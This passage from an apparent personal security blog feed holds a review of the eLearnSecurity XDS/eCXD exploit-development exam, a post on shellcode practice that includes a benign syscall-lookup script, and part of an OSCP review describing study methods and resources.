<h1 id="intro">Intro</h1>

<p>Last year, I had bought vouchers for the eWAPT and eCXD exams from eLearnSecurity. I didn’t get around to actually prepare or take those exams apart from some binary exploitation studying, but a few weeks ago when an email came saying I had until mid November to take those exams, this jolted me back to action, at least on the binary exploitation front. End of october was actually the beginning of lockdown in Germany, my contract with my previous work had just ended, so I was gonna have a few weeks of free time ahead of me, why not focus on XDS, finally get the windows part of the course down, and try the exam?</p>

<h1 id="preparation">Preparation</h1>

<p>I felt like I had enough linux binary exploitation experience from CTFs, and the few HTB boxes I did that had some bin exp in them (👀 looking at you October, Safe, Ellingson, and especially Rope), and I hadn’t come round to finishing to windows part of the course last november, so this was my focus.</p>

<p>From OSCP I was comfortable with basic vanilla buffer overflows, debugging with <a href="https://www.immunityinc.com/products/debugger/">Immunity</a>, and <a href="https://www.corelan.be/index.php/2011/07/14/mona-py-the-manual/">Mona</a>, but I wanted to try another (more modern) debugger, so I partly switched to <a href="https://x64dbg.com/">x64dbg</a>, keeping Immunity handy for Mona though. (although since then I heard there was a x64dbg <a href="https://github.com/x64dbg/mona">fork</a> for it!)</p>

<p>From the syllabus I wanted to do specifically the last windows modules:</p>

<p><img src="http://localhost:4000/assets/images/xds-syllabus.png" alt="XDS Syllabus" /></p>

<p>As I had dabbled with SEH and egghunting earlier in the year in April, but a review would be in order!</p>

<p>The repos I used for my exploit dev practice are <a href="https://github.com/arty-hlr/exploitdev-practice">here</a> and <a href="https://github.com/arty-hlr/shellcode-practice">here</a> (see my shellcode post as well). I documented the exploits I developed for all the vulnerable software I used in the windows exploit dev prep (all installed on a Winwows 7 x86 Flare VM), and the binaries are there as well if you wanna practice on them. Overall the most interesting modules were those that touched windows ROP and shellcoding, although unfortunately they were a bit shallow and only used Mona to generate the ROP chains (spoiler alert, that wouldn’t be enough for the exam).</p>

<p>Some more resources I used along the way:</p>

<ul>
  <li><a href="https://www.corelan.be/index.php/category/security/exploit-writing-tutorials/">Corelan</a></li>
  <li><a href="https://captmeelo.com/category/exploitdev">Capt. Meelo</a></li>
  <li><a href="https://h0mbre.github.io/page8/">h0mbre</a></li>
  <li><a href="http://www.fuzzysecurity.com/tutorials/expDev/1.html">fuzzySecurity</a></li>
</ul>

<h1 id="exam">Exam</h1>

<p>With only 2 weeks of review and additional prep, I wasn’t feeling 100% confident for the exam, but I wanted to get it over with, so here I went on a Wednesday at 6 PM, starting my 48 hours exam. I knew one person who had passed the exam, although not with all the points, so I wanted to see if I could. I can’t say much about the exam per se, but it was easy on one hand, and required some very specific skills on the other hand. Overall, it could and should have covered more of the syllabus though.</p>

<p>After 40 or so hours of gruesome debugging and exploiting work, here I was with shells on all objectives. A day more on the exam report (for which I used, like for OSCP, the wonderful markdown <a href="https://github.com/noraj/OSCP-Exam-Report-Template-Markdown">template</a>), and I had my weekend for me!</p>

<p>I sent my report on the 16th of November, it took until the 8th of December to get the email that I had passed though 😅 eLS can definitely do better with exam rating times!</p>

<h1 id="review">Review</h1>

<p>Overall, the course was okay <em>for complete exploit dev beginners</em>, but it covered old techniques on old OSes, and lacked some more modern things, heap stuff, x64 windows, some more in-depth module on writing ROP chains by hand, etc. It kinda makes sense as the course is called eXploit Development <em>Student</em>, so we could expect like PTS -&gt; PTP -&gt; PTX maybe some more advanced exploit dev courses like XDP or XDX who knows, but so far nothing has been announced indicating that. It’s unfortunately one of the only exploit dev courses out there (not counting OSCP or the very outdated OSCE), so I’m sure they can, or someone can do better in the future.</p>

<p>To conclude, if you’re completely new to exploit dev, do take the course as it’s gonna bring you some important basic knowledge for more advanced attacks. If you’re already familiar with linux exploit dev, and want to transfer that knowledge to windows, probably better stick to the lots of blog posts out there (that XDS often cites) and build your own lab!</p>]]></content><author><name></name></author><category term="blog" /><summary type="html"><![CDATA[A review of the XDS course/eCXD exam by eLS]]></summary></entry><entry><title type="html">Shellcode writing and new tools</title><link href="http://localhost:4000/2019/12/29/shellcode/" rel="alternate" type="text/html" title="Shellcode writing and new tools" /><published>2019-12-29T00:00:00+01:00</published><updated>2019-12-29T00:00:00+01:00</updated><id>http://localhost:4000/2019/12/29/shellcode</id><content type="html" xml:base="http://localhost:4000/2019/12/29/shellcode/"><![CDATA[<p>So I was practicing my shellcode writing skills for <a href="https://www.elearnsecurity.com/course/exploit_development_student/">XDS</a> from eLearnSecurity, and as I was working through the first basic assembly examples, I realized searching for syscalls numbers for different architectures was pretty tedious, like what’s the syscall number for <code class="language-plaintext highlighter-rouge">execve</code> in the i386 or ARM architectures, or what’s the declaration for that function, or what are the registers and instructions used for that architecture? Looking around google and asking friends on our Discord server, we didn’t find anything helping with that, so I set out on writing my own, and spent the whole evening on it!</p>

<p>I wanted to make a quick blog post about it to tell a bit about my shellcode practice journey, share that newly made tool, and maybe motivate other people to create tools when they see there isn’t any!</p>

<h2 id="shellcode-practice-journey">Shellcode practice journey</h2>

<p>As I am preparing for XDS and learning about ARM exploitation, I am writing shellcode by hand to practice assembly in different architectures, mainly i386, x86-64, ARM, and ARM64. I wanted to share a few resources for each over the next few weeks, starting with i386 today, and share my journey with shellcoding!</p>

<p>I first learned about shellcoding in <a href="https://nostarch.com/hacking2.htm">Hacking, the Art of Exploitation</a> which I read and worked through partially almost two years ago when I got into hacking, that was actually my first hacking book! Apart from the very good <code class="language-plaintext highlighter-rouge">Programming</code> and <code class="language-plaintext highlighter-rouge">Exploitation</code> chapters, which do teach the basics both of C, assembly, and binary exploitation, one of the chapters is called <code class="language-plaintext highlighter-rouge">Shellcode</code>, and was my first contact with low-level stuff used in hacking such as shellcodes. Even if that book is nearly 12 years old, the concepts explained in it are still very much relevant to today’s binary exploitation landscape, and that includes the <code class="language-plaintext highlighter-rouge">Shellcode</code> chapter. It goes from basic naive shellcode ridden with null bytes to a TCP connect-back shellcode through debugging it with GDB and understanding how the whole thing works and what strategies to use to make your shellcode usable, and it was a great help in writing those shellcodes.</p>

<p>I used that as well as the Linux shellcoding chapter of XDS as a base for my practice, but created quick helper scripts to assemble and link assembly code for x86 on a x64 machine, and create the bytes that shellcode really is. It’s usually put into a C code wrapper, but I decided to go with <code class="language-plaintext highlighter-rouge">nasm</code> and <code class="language-plaintext highlighter-rouge">ld</code> as it’s easy and quick to run them, and if I need to debug them, I can run the assembled and linked version. You’ll find those helper scripts <a href="https://github.com/arty-hlr/shellcode-practice">here</a>, for now under the <code class="language-plaintext highlighter-rouge">x86/linux</code> folder.</p>

<p>Afer having written a naive shell spawning shellcode, a null-byte free one, a TCP reverse shell shellcode, and added permission keeping capabilities to the shell spawning shellcode to keep privileges, I am now going to write some x64 ones, and then dive into an egg hunter shellcode for linux as an advanced exercise. Follow that GitHub repo linked above for more info!</p>

<h2 id="on-finding-syscall-numbers-and-creating-new-tools-in-bashpython">On finding syscall numbers and creating new tools in bash/python</h2>

<p>Most tutorials on writing shellcode just tell you plain what number syscall is under the architecture you’re working in. Like they would tell you “Yeah so you need to call execve which is syscall number 0xb or 11”, which is great, but what if I have to use other syscalls for a custom shellcode, or what if I want to port that shellcode to another architecture? How am I supposed to find the information for that syscall or new architecture, by just googling for it for 10 minutes, or bookmarking one of the few websites that makes some information available, but then what if I have to work offline for some reason? Well I was not looking forward to that, and I wanted something quick, that would tell you right away the essential information for a given syscall and architecture, and there was nothing out there. So instead of wining about it for too long on Discord, I decided to get to work and write it myself. What I wanted would give me well the syscall number obviously, but the function declaration as well to know what arguments to pass to it, and while we’re at it why not give me which registers were used for those arguments depending on the architecture, and the instruction used for the syscall, and which register to stick the syscall number in; in short I wanted to see everything I could need to make that syscall, all in one tool.</p>

<p>So I went on google and on <code class="language-plaintext highlighter-rouge">man</code> pages to look for information about syscalls, and I did find things, like <code class="language-plaintext highlighter-rouge">man syscalls</code> gives information about register and instructions, the <code class="language-plaintext highlighter-rouge">man</code> pages did give the C declaration, but for syscalls which were also bash commands like <code class="language-plaintext highlighter-rouge">read</code>, one had to go to the second <code class="language-plaintext highlighter-rouge">man</code> page to get the correct information, and I finally found out that <code class="language-plaintext highlighter-rouge">/usr/include/asm/unistd_(32|64).h</code> contained the information I wanted about the syscall number, but it was cumbersome parsing those files. That gave me a basic first script in bash, but I felt it was hacked together quickly and not very elegant:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c">#!/bin/bash</span>

<span class="k">if</span> <span class="o">[</span> <span class="nv">$# </span><span class="nt">-lt</span> 2 <span class="o">]</span> 
<span class="k">then
    </span><span class="nb">echo</span> <span class="s2">"Usage: syscall -32/-64 &lt;syscall&gt;"</span>
    <span class="nb">exit
</span><span class="k">fi

if</span> <span class="o">[</span> <span class="nv">$1</span> <span class="o">=</span> <span class="s1">'-32'</span> <span class="o">]</span>
<span class="k">then
    </span><span class="nv">file</span><span class="o">=</span><span class="s1">'unistd_32.h'</span>
    <span class="nb">echo</span> <span class="s2">"syscall in eax"</span>
    <span class="nb">echo</span> <span class="s2">"args in ebx, ecx, edx, esi, edi, ebp"</span>
<span class="k">else
    </span><span class="nv">file</span><span class="o">=</span><span class="s1">'unistd_64.h'</span>
    <span class="nb">echo</span> <span class="s2">"syscall in rax"</span>
    <span class="nb">echo</span> <span class="s2">"args in rdi, rsi, rdx, r10, r8, r9"</span>
<span class="k">fi

</span><span class="nv">n</span><span class="o">=</span><span class="si">$(</span><span class="nb">grep</span> <span class="s2">"_</span><span class="nv">$2</span><span class="s2"> "</span> /usr/include/asm/<span class="nv">$file</span> | <span class="nb">cut</span> <span class="nt">-d</span> <span class="s1">' '</span> <span class="nt">-f</span> 3<span class="si">)</span>
<span class="nb">printf</span> <span class="s2">"0x%x - %d</span><span class="se">\n</span><span class="s2">"</span> <span class="nv">$n</span> <span class="nv">$n</span>

<span class="nv">decl</span><span class="o">=</span><span class="si">$(</span>man <span class="nv">$2</span> | <span class="nb">grep</span> <span class="s2">"</span><span class="nv">$2</span><span class="s2">("</span> | <span class="nb">head</span> <span class="nt">-1</span> | <span class="nb">cut</span> <span class="nt">-d</span> <span class="s1">';'</span> <span class="nt">-f</span> 1<span class="si">)</span>
<span class="k">if</span> <span class="o">[</span> <span class="o">!</span> <span class="nv">$decl</span> 2&gt; /dev/null <span class="o">]</span>
<span class="k">then
    </span><span class="nv">decl</span><span class="o">=</span><span class="si">$(</span>man <span class="nv">$2</span>.2 | <span class="nb">grep</span> <span class="s2">"</span><span class="nv">$2</span><span class="s2">("</span> | <span class="nb">head</span> <span class="nt">-1</span> | <span class="nb">cut</span> <span class="nt">-d</span> <span class="s1">';'</span> <span class="nt">-f</span> 1<span class="si">)</span>
<span class="k">fi
</span><span class="nb">echo</span> <span class="nv">$decl</span>
</code></pre></div></div>

<p>And well it only gave me syscall numbers for i386 and x86-64 as even with the binutils packages installed for ARM and ARM64, I could not locate similar files, so I was a bit disappointed. When I finally stumbled upon a whole folder in the gdb documentation directory (don’t ask me how I found it, I don’t remember what I was searching for with that <code class="language-plaintext highlighter-rouge">locate</code> command haha) with an XML file for each architecture with numbers for each syscalls, I was in heaven! I knew I just had to parse that XML file to look for the syscall, which was pretty easy to do after diving for a few minutes in the documentation for the XML parsing python library, then I copied the info in <code class="language-plaintext highlighter-rouge">man syscall</code>, parsed it quickly in vim to make it like a dictionary, and I was done, I had all the information I needed! Here’s the full script:</p>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">#!/usr/bin/python3
</span>
<span class="kn">import</span> <span class="nn">xml.etree.ElementTree</span> <span class="k">as</span> <span class="n">ET</span>
<span class="kn">import</span> <span class="nn">sys</span>
<span class="kn">import</span> <span class="nn">os</span>
<span class="kn">import</span> <span class="nn">subprocess</span>

<span class="k">if</span> <span class="nb">len</span><span class="p">(</span><span class="n">sys</span><span class="p">.</span><span class="n">argv</span><span class="p">)</span> <span class="o">&lt;</span> <span class="mi">3</span><span class="p">:</span>
    <span class="k">print</span><span class="p">(</span><span class="s">'Usage: syscall &lt;arch&gt; &lt;syscall&gt;'</span><span class="p">)</span>
    <span class="nb">exit</span><span class="p">()</span>

<span class="n">infos</span> <span class="o">=</span> <span class="p">{</span>
    <span class="s">'arm64'</span><span class="p">:(</span><span class="s">'aarch64-linux'</span><span class="p">,(</span><span class="s">'x0'</span><span class="p">,</span><span class="s">'x1'</span><span class="p">,</span><span class="s">'x2'</span><span class="p">,</span><span class="s">'x3'</span><span class="p">,</span><span class="s">'x4'</span><span class="p">,</span><span class="s">'x5'</span><span class="p">),(</span><span class="s">'svc #0'</span><span class="p">,</span><span class="s">'x8'</span><span class="p">,</span><span class="s">'x0'</span><span class="p">)),</span>
    <span class="s">'x64'</span><span class="p">:(</span><span class="s">'amd64-linux'</span><span class="p">,(</span><span class="s">'rdi'</span><span class="p">,</span><span class="s">'rsi'</span><span class="p">,</span><span class="s">'rdx'</span><span class="p">,</span><span class="s">'r10'</span><span class="p">,</span><span class="s">'r8'</span><span class="p">,</span><span class="s">'r9'</span><span class="p">),(</span><span class="s">'syscall'</span><span class="p">,</span><span class="s">'rax'</span><span class="p">,</span><span class="s">'rax'</span><span class="p">)),</span>
    <span class="s">'arm'</span><span class="p">:(</span><span class="s">'arm-linux'</span><span class="p">,(</span><span class="s">'r0'</span><span class="p">,</span><span class="s">'r1'</span><span class="p">,</span><span class="s">'r2'</span><span class="p">,</span><span class="s">'r3'</span><span class="p">,</span><span class="s">'r4'</span><span class="p">,</span><span class="s">'r5'</span><span class="p">),(</span><span class="s">'swi 0x0'</span><span class="p">,</span><span class="s">'r7'</span><span class="p">,</span><span class="s">'r0'</span><span class="p">)),</span>
    <span class="s">'x86'</span><span class="p">:(</span><span class="s">'i386-linux'</span><span class="p">,(</span><span class="s">'ebx'</span><span class="p">,</span><span class="s">'ecx'</span><span class="p">,</span><span class="s">'edx'</span><span class="p">,</span><span class="s">'esi'</span><span class="p">,</span><span class="s">'edi'</span><span class="p">,</span><span class="s">'ebp'</span><span class="p">),(</span><span class="s">'int $0x80'</span><span class="p">,</span><span class="s">'eax'</span><span class="p">,</span><span class="s">'eax'</span><span class="p">)),</span>
    <span class="s">'mips32'</span><span class="p">:(</span><span class="s">'mips-n32-linux'</span><span class="p">,(</span><span class="s">'a0'</span><span class="p">,</span><span class="s">'a1'</span><span class="p">,</span><span class="s">'a2'</span><span class="p">,</span><span class="s">'a3'</span><span class="p">,</span><span class="s">'a4'</span><span class="p">,</span><span class="s">'a5'</span><span class="p">),(</span><span class="s">'syscall'</span><span class="p">,</span><span class="s">'v0'</span><span class="p">,</span><span class="s">'v0'</span><span class="p">)),</span>
    <span class="s">'mips64'</span><span class="p">:(</span><span class="s">'mips-n64-linux'</span><span class="p">,(</span><span class="s">'a0'</span><span class="p">,</span><span class="s">'a1'</span><span class="p">,</span><span class="s">'a2'</span><span class="p">,</span><span class="s">'a3'</span><span class="p">,</span><span class="s">'a4'</span><span class="p">,</span><span class="s">'a5'</span><span class="p">),(</span><span class="s">'syscall'</span><span class="p">,</span><span class="s">'v0'</span><span class="p">,</span><span class="s">'v0'</span><span class="p">)),</span>
    <span class="s">'ppc64'</span><span class="p">:(</span><span class="s">'ppc-n64-linux'</span><span class="p">,(</span><span class="s">'r3'</span><span class="p">,</span><span class="s">'r4'</span><span class="p">,</span><span class="s">'r5'</span><span class="p">,</span><span class="s">'r6'</span><span class="p">,</span><span class="s">'r7'</span><span class="p">,</span><span class="s">'r8'</span><span class="p">),(</span><span class="s">'sc'</span><span class="p">,</span><span class="s">'r0'</span><span class="p">,</span><span class="s">'r3'</span><span class="p">)),</span>
    <span class="s">'ppc'</span><span class="p">:(</span><span class="s">'ppc-n-linux'</span><span class="p">,(</span><span class="s">'r3'</span><span class="p">,</span><span class="s">'r4'</span><span class="p">,</span><span class="s">'r5'</span><span class="p">,</span><span class="s">'r6'</span><span class="p">,</span><span class="s">'r7'</span><span class="p">,</span><span class="s">'r8'</span><span class="p">),(</span><span class="s">'sc'</span><span class="p">,</span><span class="s">'r0'</span><span class="p">,</span><span class="s">'r3'</span><span class="p">)),</span>
    <span class="s">'sparc64'</span><span class="p">:</span><span class="s">'sparch-n64-linux'</span><span class="p">,</span>
    <span class="s">'sparc'</span><span class="p">:(</span><span class="s">'sparc-n-linux'</span><span class="p">,(</span><span class="s">'o0'</span><span class="p">,</span><span class="s">'o1'</span><span class="p">,</span><span class="s">'o2'</span><span class="p">,</span><span class="s">'o3'</span><span class="p">,</span><span class="s">'o4'</span><span class="p">,</span><span class="s">'o5'</span><span class="p">),(</span><span class="s">'t'</span><span class="p">,</span><span class="s">'0x10'</span><span class="p">,</span><span class="s">'g1'</span><span class="p">,</span><span class="s">'o0'</span><span class="p">)),</span>
    <span class="s">'sparc64'</span><span class="p">:(</span><span class="s">'sparc-n-linux'</span><span class="p">,(</span><span class="s">'o0'</span><span class="p">,</span><span class="s">'o1'</span><span class="p">,</span><span class="s">'o2'</span><span class="p">,</span><span class="s">'o3'</span><span class="p">,</span><span class="s">'o4'</span><span class="p">,</span><span class="s">'o5'</span><span class="p">),(</span><span class="s">'t'</span><span class="p">,</span><span class="s">'0x6d'</span><span class="p">,</span><span class="s">'g1'</span><span class="p">,</span><span class="s">'o0'</span><span class="p">))</span>
<span class="p">}</span>

<span class="n">arch</span> <span class="o">=</span> <span class="n">sys</span><span class="p">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span>
<span class="n">filename</span> <span class="o">=</span> <span class="n">infos</span><span class="p">[</span><span class="n">arch</span><span class="p">][</span><span class="mi">0</span><span class="p">]</span>
<span class="n">order</span> <span class="o">=</span> <span class="n">infos</span><span class="p">[</span><span class="n">arch</span><span class="p">][</span><span class="mi">1</span><span class="p">]</span>
<span class="n">instruction_sys_ret</span> <span class="o">=</span> <span class="n">infos</span><span class="p">[</span><span class="n">arch</span><span class="p">][</span><span class="mi">2</span><span class="p">]</span>
<span class="n">name</span> <span class="o">=</span> <span class="n">sys</span><span class="p">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">2</span><span class="p">]</span>
<span class="n">filepath</span> <span class="o">=</span> <span class="n">os</span><span class="p">.</span><span class="n">path</span><span class="p">.</span><span class="n">dirname</span><span class="p">(</span><span class="n">os</span><span class="p">.</span><span class="n">path</span><span class="p">.</span><span class="n">realpath</span><span class="p">(</span><span class="n">__file__</span><span class="p">))</span><span class="o">+</span><span class="s">'/syscalls/'</span><span class="o">+</span><span class="n">filename</span><span class="o">+</span><span class="s">'.xml'</span>

<span class="n">syscall</span> <span class="o">=</span> <span class="n">ET</span><span class="p">.</span><span class="n">parse</span><span class="p">(</span><span class="s">'{}'</span><span class="p">.</span><span class="nb">format</span><span class="p">(</span><span class="n">filepath</span><span class="p">)).</span><span class="n">getroot</span><span class="p">().</span><span class="n">find</span><span class="p">(</span><span class="s">"./syscall[@name='{}']"</span><span class="p">.</span><span class="nb">format</span><span class="p">(</span><span class="n">name</span><span class="p">)).</span><span class="n">attrib</span><span class="p">[</span><span class="s">'number'</span><span class="p">]</span>
<span class="n">declaration</span> <span class="o">=</span> <span class="n">subprocess</span><span class="p">.</span><span class="n">check_output</span><span class="p">(</span><span class="s">'man {} | grep "{}(" | head -1 | cut -d ";" -f 1'</span><span class="p">.</span><span class="nb">format</span><span class="p">(</span><span class="n">name</span><span class="p">,</span><span class="n">name</span><span class="p">),</span> <span class="n">shell</span><span class="o">=</span><span class="bp">True</span><span class="p">).</span><span class="n">decode</span><span class="p">().</span><span class="n">strip</span><span class="p">()</span>
<span class="k">if</span> <span class="ow">not</span> <span class="n">declaration</span><span class="p">:</span>
    <span class="n">declaration</span> <span class="o">=</span> <span class="n">subprocess</span><span class="p">.</span><span class="n">check_output</span><span class="p">(</span><span class="s">'man {}.2 | grep "{}(" | head -1 | cut -d ";" -f 1'</span><span class="p">.</span><span class="nb">format</span><span class="p">(</span><span class="n">name</span><span class="p">,</span><span class="n">name</span><span class="p">),</span> <span class="n">shell</span><span class="o">=</span><span class="bp">True</span><span class="p">).</span><span class="n">decode</span><span class="p">().</span><span class="n">strip</span><span class="p">()</span>

<span class="k">print</span><span class="p">(</span><span class="s">'For {}:'</span><span class="p">.</span><span class="nb">format</span><span class="p">(</span><span class="n">arch</span><span class="p">))</span>
<span class="k">print</span><span class="p">(</span><span class="s">'The instruction is {}, the syscall register is {}, and the return register is {}'</span><span class="p">.</span><span class="nb">format</span><span class="p">(</span><span class="o">*</span><span class="n">instruction_sys_ret</span><span class="p">))</span>
<span class="k">print</span><span class="p">(</span><span class="s">'The registers for the arguments are: {}'</span><span class="p">.</span><span class="nb">format</span><span class="p">(</span><span class="s">', '</span><span class="p">.</span><span class="n">join</span><span class="p">(</span><span class="n">order</span><span class="p">)))</span>
<span class="k">print</span><span class="p">(</span><span class="s">'The syscall is {}/{}'</span><span class="p">.</span><span class="nb">format</span><span class="p">(</span><span class="nb">hex</span><span class="p">(</span><span class="nb">int</span><span class="p">(</span><span class="n">syscall</span><span class="p">)),</span><span class="n">syscall</span><span class="p">))</span>
<span class="k">print</span><span class="p">(</span><span class="s">'The syscall function declaration is: </span><span class="se">\n</span><span class="s">{}'</span><span class="p">.</span><span class="nb">format</span><span class="p">(</span><span class="n">declaration</span><span class="p">))</span>
</code></pre></div></div>

<p>And here’s a sample output:</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>└──╼ $syscall x86 execve
For x86:
The instruction is int $0x80, the syscall register is eax, and the return register is eax
The registers for the arguments are: ebx, ecx, edx, esi, edi, ebp
The syscall is 0xb/11
The syscall function declaration is:
int execve(const char *path, char *const argv[], char *const envp[])
</code></pre></div></div>

<p>I was pretty happy with it, and I finally could set out on my shellcoding practice journey knowing I would have syscall info at the fingertips.</p>

<h2 id="conclusion">Conclusion</h2>

<p>In the end, I just wanted to describe the process and journey I went through to create those simple helper scripts to show people how they too can write tools and contribute to the infosec community by sharing it. I believe it is in the hacker spirit to create one’s own tools when they don’t exist, and I hope that inspired people to take the time to do that; on the one hand yes it does take some time to do research, but on the other hand you’ll learn so much about so many things in the process, and you’ll use your l33t scripting skills, or build them in the process!</p>

<p>I am looking forward to my shellcoding practice journey, and I hope that inspired you to do so as well and learn more about assembly! Here are the GitHub repos I use for shellcode practice and for the syscall script:</p>

<p><a href="https://github.com/arty-hlr/shellcode-practice">Shellcode practice</a></p>

<p><a href="https://github.com/arty-hlr/syscall_info">syscall script</a></p>]]></content><author><name></name></author><category term="blog" /><summary type="html"><![CDATA[Documenting my journey writing shellcode]]></summary></entry><entry><title type="html">OSCP Review</title><link href="http://localhost:4000/2019/12/10/oscp-review/" rel="alternate" type="text/html" title="OSCP Review" /><published>2019-12-10T00:00:00+01:00</published><updated>2019-12-10T00:00:00+01:00</updated><id>http://localhost:4000/2019/12/10/oscp-review</id><content type="html" xml:base="http://localhost:4000/2019/12/10/oscp-review/"><![CDATA[<p>So, first blog post had to be about OSCP even if I passed it two months ago, or my buddies in the Infosec Prep discord server would be mad! So here we go, short(ish) review of PWK (the course), OSCP (the exam), what preparation I had, a few pieces of advice, and what’s next!</p>

<p><img src="http://localhost:4000/assets/images/oscp_logo.png" alt="" /></p>

<h2 id="update-250221">UPDATE 25.02.21</h2>

<p>This post refers to the PWK v1, since I took the course and exam, PWK v2 aka <a href="https://www.offensive-security.com/pwk-oscp/">PEN-200</a> was released, with more information than v1, especially some AD stuff, and updated labs, so so I’ve heard. So take what follows with a grain of salt!</p>

<h2 id="background-and-preparation-before">Background and preparation before</h2>

<p>I started getting in the infosec world in January 2018, coming from a mathematics background with almost no programming experience. Along the way I picked up good Linux knowledge, C, python, and did quite a few CTFs. So that was me before the summer 2019, some CTF experience, some programming experience, but no “hacking a machine” experience.</p>

<p>I didn’t have in mind at all to go through OSCP this year back during the summer, but I got started on HTB anyway, and got to pro hacker rank by August, so I had 10 HTB machines, mostly active), under my belt by the end of August, thanks to <a href="https://www.youtube.com/channel/UCa6eh7gCkpPo5XXUDfygQQA">Ippsec</a> basically, and also thanks to the huge community on HTB’s official Discord server who gave me tips and nudges when needed.</p>

<p>So that was my “preparation”, between quotes because even mid-August I had no idea I was gonna be signing up for OSCP in a few weeks time! But well at that point in time I was talking with a recruiter on Discord who said that he would have jobs for me in Europe with OSCP, so that got me thinking, got me motivated to try my hand at the huge beast I thought OSCP was, realized I had one month free before the start of my university year, so I gathered why not, and on the 8th of September I received my access to PWK!</p>

<h2 id="first-steps-in-pwk-labs">First steps in PWK labs</h2>

<p>Sunday morning after receiving the VPN access I went straight into the labs while browsing through the PDF quickly, I was fairly comfortable with most subjects and I wanted to get a taste of the labs. I wasn’t disappointed at first, got a list of all hosts’ IPs, and started playing with the first one on the list, which went ok as it was fairly easy, but isn’t what I’d recommend really. We have a bot on the Infosec Prep server that tells how difficult a machine is and whether or not it has dependencies, meaning machines you should root before, and I relied on it to see which machine I wanted to try after, but the best idea would have been to do a sweep of all hosts looking for low-hanging fruits like Samba and other ports holding usually vulnerable services.</p>

<p>I was going full-time on PWK, not having anything else to do with uni, so I must have spent around 8-9 hours a day in the labs the first two weeks, and rooted about 10 boxes a week (not that numbers matter anyway actually). I had great fun, even if some machines were pretty frustrating (when you see some bad documentation in French in the labs, you’ll understand), but it was ok, and having the community being there too was great. Did I mention that I started the labs along with two other guys from that discord server? Having people around who are doing it at the same time as you are is great, creates bonds on a period of 1-2 months of constant daily messages!</p>

<h2 id="getting-tired-of-the-labs">Getting tired of the labs</h2>

<p>Two weeks in, I was getting tired of the PWK labs to be honest, and I won’t hide that. Some machines were easy as common credentials, all are old a* f***, so old that kernel exploits work on a lot of them, but you’d have to compile them on old VMs, which was a pain. Maybe I should have looked more at privilege escalation routes that didn’t use kernel exploits, more than the few times I did, but I was growing tired of the age of the lab and how some machines were really buggy sometimes. I was not looking forward to the next machine on my to-do list, and I needed something fresh. I was longing to go back to HTB as well, since I had focused solely on PWK for the last two weeks, so I decided to go back there and take a break from the PWK labs.</p>

<p><img src="http://localhost:4000/assets/images/oscp_htb_logo.png" alt="Back to HTB!" /></p>

<p>That was probably one of the best decisions I’ve made during my preparation for the exam, taking a break from PWK and working on other sources and other stuff more relevant to the exam. I knew pivoting was part of PWK for example, and I did try that a bit, but it didn’t interest me that much and I knew I wouldn’t have to pivot in the exam, so scratch that. Instead I took the list of OSCP-like HTB machines, and went through that.</p>

<p><img src="http://localhost:4000/assets/images/oscp_htb_machines.jpg" alt="List of OSCP-like machines" /></p>

<p>That got me motivated again, and it taught me a lot as well. One thing I should emphasize is that I was taking detailed notes in markdown for each machine to have and go through later, and as a preparation for the exam report. I didn’t do the exercises, so no lab report for me (not worth it anyway, going through all the exercises and document them, and documenting 10 machines that have different types of vulns is way too much work for a poor 5 points in my opinion and prepping you for failing on the exam, more on that later), so I could focus on hacking machines.</p>

<h2 id="focusing-on-weak-points">Focusing on weak points</h2>

<p>At that 3 weeks/one month point, I made a list of what I was good at, and what I wasn’t so good at compared to the PWK syllabus, and decided to take a break from hacking machines and instead work more specifically on my weak points, which were SQL injections, Windows in general, and privilege escalation on Windows. So I worked on <a href="https://portswigger.net/web-security">Portswigger</a>’s SQL labs, which helped a lot, and downloaded the <a href="https://github.com/sagishahar/lpeworkshop">lpeworkshop</a>, which was a great decision. The slides and PDFs are quite dry and usually just show what the vulnerability is and how to exploit it, and sometimes even with GUI tools, so I decided to take it as a lab machine, and make notes on how to find and exploit each vulnerability lab style, that means from a reverse shell that I would have gotten from another exploit. That was very rewarding work, even if it took some time (as I’m nice <a href="https://github.com/arty-hlr/privesc_notes">here</a> are those notes) and I learned a lot especially about Windows. When tib3rius from the Infosec Prep server announced his Linux privesc Udemy course, I got it as well as I thought it would be helpful in going through everything again, and it definitely was, and not expensive at all, <a href="https://www.udemy.com/course/linux-privilege-escalation/">here</a>’s the link to it.</p>

<p>It was around that time as well that I tried out tib3rius’ <a href="https://github.com/Tib3rius/AutoRecon">autorecon</a> tool to automate the initial enumeration phase of the exam. I wasn’t convinced at all at the start, but it was a wise decision to use it as it’s very helpful to speed up the enumeration part, just launch it, let it work and do the things you would have done anyway like gobuster or nikto, and when it’s done just go through its results. For situations like OSCP when time is counted and you can do something useful during the time autorecon takes, definitely very useful.</p>

<p>It’s also around that time that I decided to schedule my exam, I knew spots were booked early, so I wanted to have mine well before exam time. I booked a Wednesday mid-October at 7 am, I wanted to be fresh and not waste waking hours not on the exam, and I was clearly going in with the idea that I would do an all-nighter and work on the exam the full 24 hours.</p>

<h2 id="working-on-the-buffer-overflow">Working on the buffer overflow</h2>

<p>I had pushed back working on the buffer overflow (BOF for short) because that was something I had done in the past thanks to Jon Erickon’s <a href="https://nostarch.com/hacking2.htm">book</a> <code class="language-plaintext highlighter-rouge">Hacking, the Art of Exploitation</code>, and I knew I just needed to get used to it on Windows and above all get familiar and comfortable with Immunity. That took a bit of time, but it was great discovering Immunity and mona (DO read its <a href="https://www.corelan.be/index.php/2011/07/14/mona-py-the-manual/">documentation</a>, great tool, learn to use it), and I wrote a skeleton script for the exam BOF to gain some time. I basically just had to comment and uncomment code and go through it step by step, and it saved me a lot of time writing code on the exam (I’m nice, but providing it to you wouldn’t help you really, instead just do what I did and write your own!). Here are some resources I used for the BOF preparation:</p>

<ul>
  <li><a href="https://github.com/justinsteven/dostackbufferoverflowgood">dostackoverflowgood</a> (very basic though)</li>
  <li><a href="https://github.com/stephenbradshaw/vulnserver">vulnserver</a>’s TRUN</li>
  <li>SLMail (described in the PWK PDF)</li>
</ul>

<p>Once that BOF practice was done I felt a bit more ready for the exam, at least I knew I had covered every point in the syllabus.</p>

<h2 id="time-for-a-mockup-exam">Time for a mockup exam</h2>

